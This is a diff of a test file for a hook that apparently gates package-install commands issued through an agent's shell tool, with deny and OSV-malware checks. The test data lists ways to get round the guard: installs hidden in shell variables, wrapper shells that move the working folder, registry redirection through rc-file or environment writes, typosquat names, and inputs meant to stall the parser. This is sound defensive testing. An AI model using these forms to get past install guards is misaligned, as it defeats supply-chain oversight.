+      expect(pkgNames('dotnet add package Zz.Fake')[0]).toBe('Zz.Fake');
+      expect(pkgNames('dotnet add zz.csproj package Zz.Fake --version 1.0.0')[0]).toBe('Zz.Fake');
+    });
+    it('brew install names the formula', () => {
+      expect(pkgNames('brew install zz-fake-pkg-a1')).toEqual(['zz-fake-pkg-a1']);
+    });
+    it.each([
+      'cargo binstall zz-fake-crate',
+      'dotnet add package Zz.Fake',
+      'dotnet add zz.csproj package Zz.Fake --version 1.0.0',
+      'brew install zz-fake-pkg-a1',
+      'sudo brew install zz-fake-pkg-a1',
+    ])('built hook gates %j like cargo install (no blocklist, OSV or age check)', async (cmd) => {
+      const r = await runHookFull(cmd, { stub: OLD });
+      gated(r.decision);
+      expect(r.reason).toMatch(/No blocklist, OSV or age check exists/);
+    });
+    it.each([
+      'dotnet add "zz proj.csproj" package Zz.Fake',
+      "dotnet add 'zz proj.csproj' package Zz.Fake",
+      'dotnet package add Zz.Fake',
+      'dotnet tool install -g Zz.Fake',
+      'dotnet tool update -g Zz.Fake',
+      'dotnet.exe add package Zz.Fake',
+      'C:\\dotnet\\dotnet.exe tool install Zz.Fake',
+      'dotnet -d add package Zz.Fake',
+      'dotnet --diagnostics add zz.csproj package Zz.Fake',
+      'dotnet tool run zz-fake-tool',
+      'dotnet tool exec Zz.Fake',
+      'dotnet dnx Zz.Fake',
+      'dnx Zz.Fake',
+      'dnx.exe Zz.Fake --yes',
+    ])('built hook gates the dotnet form %j', async (cmd) => {
+      const r = await runHookFull(cmd, { stub: OLD });
+      gated(r.decision);
+    });
+    it.each(['dotnet tool list', 'dotnet package list', 'dotnet add "zz proj.csproj" reference ../x.csproj', 'dotnet ef database update', 'dotnet tool restore'])('regression: %j allows', async (cmd) => {
+      expect(await runHook(cmd, { stub: FRESH })).toBeUndefined();
+    });
+    it('changed (round 3 MEDIUM a): 4 option pairs (8 words, the bound) before and after add still match', () => {
+      const words = Array(4).fill('-x zz').join(' ');
+      const t0 = Date.now();
+      expect(isPackageInstallCommand(`dotnet ${words} add ${words} reference`)).toBe(false);
+      expect(isPackageInstallCommand(`dotnet ${words} add ${words} package Zz.Fake`)).toBe(true);
+      expect(Date.now() - t0).toBeLessThan(2000);
+    });
+    it('regression: cargo install is still gated the same way', async () => {
+      gated(await runHook('cargo install zz-fake-crate', { stub: OLD }));
+    });
+    it.each([
+      'dotnet add reference ../zz.csproj',
+      'dotnet build',
+      'brew list',
+      'brew --version',
+      'cargo build',
+    ])('regression: %j allows', async (cmd) => {
+      expect(await runHook(cmd, { stub: FRESH })).toBeUndefined();
+    });
+  });
+
+  // ----- Round 3 verify (aegis): HIGH 1-3, MEDIUM a-e -----
+  describe('round 3 verify', () => {
+    async function tempRoot(): Promise<string> {
+      const { mkdtempSync } = await import('node:fs');
+      const { tmpdir } = await import('node:os');
+      const { join } = await import('node:path');
+      return mkdtempSync(join(tmpdir(), 'pig-r3-'));
+    }
+    /** <root>/node_modules/.bin with these files, and these names as folders (each holds a file k). */
+    async function binDir(root: string, files: string[], dirs: string[] = []): Promise<string> {
+      const { mkdirSync, writeFileSync } = await import('node:fs');
+      const { join } = await import('node:path');
+      const bin = join(root, 'node_modules', '.bin');
+      mkdirSync(bin, { recursive: true });
+      writeFileSync(join(root, 'package.json'), '{}');
+      for (const f of files) writeFileSync(join(bin, f), '');
+      for (const d of dirs) { mkdirSync(join(bin, d)); writeFileSync(join(bin, d, 'k'), ''); }
+      return root;
+    }
+    const MAL: Stub = { ageHours: 2400, osvMal: true };
+
+    describe('HIGH 1: the local bin must be a file with the exact name', () => {
+      it('a folder named like the bin is not a bin: cd ./d; npx and plain npx in d both deny', async () => {
+        const { join } = await import('node:path');
+        const root = await tempRoot();
+        const d = await binDir(join(root, 'd'), [], ['zz-lodahs-a1']);
+        expect(await runHook('cd ./d; npx zz-lodahs-a1', { stub: FRESH, cwd: root })).toBe('deny');
+        expect(await runHook('npx zz-lodahs-a1', { stub: FRESH, cwd: d })).toBe('deny');
+      });
+      it.each(['zz-lodahs-b2.cmd', 'zz-lodahs-b2.ps1'])('a lone %s is not the bin npm runs: npx denies', async (file) => {
+        const cwd = await binDir(await tempRoot(), [file]);
+        expect(await runHook('npx zz-lodahs-b2', { stub: FRESH, cwd })).toBe('deny');
+      });
+      it('regression: the exact-name file still skips the checks', async () => {
+        const cwd = await binDir(await tempRoot(), ['zz-lodahs-c3']);
+        expect(await runHook('npx zz-lodahs-c3', { stub: FRESH, cwd })).toBeUndefined();
+      });
+    });
+
+    describe('HIGH 2: an unknown uv global option before the verb asks', () => {
+      it.each([
+        'uv --preview-features run pip install zz-fake-pkg-a1',
+        'uv --zz-unknown run --with zz-fake-pkg-a1 python x.py',
+        'uv --zz-unknown=1 add zz-fake-pkg-a1',
+      ])('%j is gated as a command the guard cannot parse', async (cmd) => {
+        const r = await runHookFull(cmd, { stub: OLD });
+        gated(r.decision);
+        expect(r.reason).toMatch(/cannot parse/);
+      });
+      it('regression: listed uv flags still read the plain form', async () => {
+        expect(await runHook('uv -q --offline --no-cache run --with zz-fake-pkg-a1 python x.py', { stub: FRESH })).toBe('deny');
+        expect(await runHook('uv --quiet run pytest -q', { stub: FRESH })).toBeUndefined();
+      });
+    });
+
+    describe('HIGH 3: Bash splits an unquoted variable interpreter into words', () => {
+      it.each([
+        "PY='npx lodahs'; $PY -m pip install zz-fake-pkg-a1==1.0.0",
+        '${PY} -m pip install zz-fake-pkg-a1==1.0.0',
+        '$VENV/bin/python -m pip install zz-fake-pkg-a1==1.0.0',
+      ])('Bash: %j (pinned, clean) is gated', async (cmd) => {
+        gated(await runHook(cmd, { stub: OLD }));
+      });
+      it.each([
+        ['Bash', '"$PY" -m pip install zz-fake-pkg-a1==1.0.0'],
+        ['Bash', '"${PY}" -m pip install zz-fake-pkg-a1==1.0.0'],
+        ['Bash', '"$VENV/bin/python" -m pip install zz-fake-pkg-a1==1.0.0'],
+        ['PowerShell', '& $python -m pip install zz-fake-pkg-a1==1.0.0'],
+        ['PowerShell', '& $env:PYTHON -m pip install zz-fake-pkg-a1==1.0.0'],
+      ])('regression: %s %j (one interpreter word, pinned, clean) allows', async (tool, cmd) => {
+        expect(await runHook(cmd, { tool, stub: OLD })).toBeUndefined();
+      });
+    });
+
+    describe('MEDIUM a/b: no catastrophic backtracking', () => {
+      it('1500 repeated "dotnet add" words scan in under 1 s', () => {
+        const t0 = Date.now();
+        expect(installSegments('echo' + ' dotnet add'.repeat(1500) + '; npx zz-fake-pkg-a1')).toContain('npx zz-fake-pkg-a1');
+        expect(Date.now() - t0).toBeLessThan(1000);
+      }, 60_000);
+      it.each([
+        'npm' + ' --prefix'.repeat(45) + ' zz; pip install zz-fake-pkg-a1',
+        'pip' + ' --proxy'.repeat(45) + ' zz; npm install zz-fake-pkg-a1',
+      ])('45 repeated value flags do not stall the hook (#%#)', async (cmd) => {
+        const t0 = Date.now();
+        gated(await runHook(cmd, { stub: FRESH }));
+        expect(Date.now() - t0).toBeLessThan(5000);
+      }, 30_000);
+    });
+
+    describe('MEDIUM c: rc-file and environment writes count as a registry change', () => {
+      it.each([
+        ['PowerShell', `Set-Content .npmrc "registry=${REG}"; npm install`],
+        ['PowerShell', `Set-Content -Path '.npmrc' -Value 'registry=${REG}'; npm install`],
+        ['PowerShell', `Add-Content .yarnrc.yml "npmRegistryServer: ${REG}"; yarn install`],
+        ['PowerShell', `"registry=${REG}" | Out-File .npmrc; npm install`],
+        ['PowerShell', `sc .npmrc "registry=${REG}"; npm install`],
+        ['PowerShell', 'Copy-Item zz.npmrc .npmrc; npm ci'],
+        ['PowerShell', 'Move-Item zz.txt .npmrc; npm install'],
+        ['PowerShell', `Set-Item Env:npm_config_registry '${REG}'; npm install`],
+        ['PowerShell', `[Environment]::SetEnvironmentVariable('npm_config_registry', '${REG}', 'User'); npm install`],
+        ['Bash', 'cp zz.npmrc .npmrc && npm install'],
+        ['Bash', 'mv zz.toml bunfig.toml && bun install'],
+        ['Bash', `echo 'registry = "${REG}"' > bunfig.toml && bun install`],
+        ['Bash', 'cp zz.ini pip.ini && pip install -r requirements.txt'],
+        ['Bash', 'cp zz.conf ~/.config/pip/pip.conf && pip install -r requirements.txt'],
+      ])('%s: %j is gated', async (tool, cmd) => {
+        gated(await runHook(cmd, { tool, stub: OLD }));
+      });
+      it.each([
+        ['PowerShell', "Set-Content notes.txt 'hello'; npm install"],
+        ['Bash', 'cp a.txt b.txt && npm install'],
+      ])('regression: %s %j allows', async (tool, cmd) => {
+        expect(await runHook(cmd, { tool, stub: OLD })).toBeUndefined();
+      });
+      it('changed (round 4 G2 raw rule): echoing a registry variable then a bare install is gated', async () => {
+        gated(await runHook('echo $env:npm_config_registry; npm install', { tool: 'PowerShell', stub: OLD }));
+      });
+    });
+
+    describe('MEDIUM d: a pypi version is known only with an exact pin', () => {
+      it.each(["uv add 'zz-fake-pkg-a1>=1.0'", 'uv add zz-fake-pkg-a1~=1.0', "poetry add 'zz-fake-pkg-a1<2.0'"])('%j: the OSV deny says the version is unknown', async (cmd) => {
+        const r = await runHookFull(cmd, { stub: MAL });
+        expect(r.decision).toBe('deny');
+        expect(r.reason).toMatch(/MAL-2026-0001/);
+        expect(r.reason).toMatch(/version[^.]*unknown|unknown[^.]*version/i);
+      });
+      it.each(['pip install zz-fake-pkg-a1==1.0.0', 'uv add zz-fake-pkg-a1===1.0.0'])('regression: %j names the advisory with no unknown note', async (cmd) => {
+        const r = await runHookFull(cmd, { stub: MAL });
+        expect(r.decision).toBe('deny');
+        expect(r.reason).toMatch(/MAL-2026-0001/);
+        expect(r.reason).not.toMatch(/unknown/i);
+      });
+    });
+
+    describe('MEDIUM e: more options that move the folder make it unknown', () => {
+      // Unquoted folder and -c: the wrapper payload is read, and -c (unlike -Command) does not hit the -C option arm.
+      const u = (d: string) => d.replace(/\\/g, '/');
+      it.each([
+        (d: string) => `pwsh -WorkingDirectory ${u(d)} -c "npx zz-lodahs-c3"`,
+        (d: string) => `pwsh -wd ${u(d)} -c "npx zz-lodahs-c3"`,
+        (d: string) => `powershell -workingdirectory ${u(d)} -c "npx zz-lodahs-c3"`,
+        (d: string) => `sudo -D "${d}" npx zz-lodahs-c3`,
+        (d: string) => `sudo -D"${d}" npx zz-lodahs-c3`,
+      ])('payload cwd has the bin, but %s moves away: denies (#%#)', async (make) => {
+        const cwd = await binDir(await tempRoot(), ['zz-lodahs-c3']);
+        expect(await runHook(make(await tempRoot()), { stub: FRESH, cwd })).toBe('deny');
+      });
     });
   });
 });
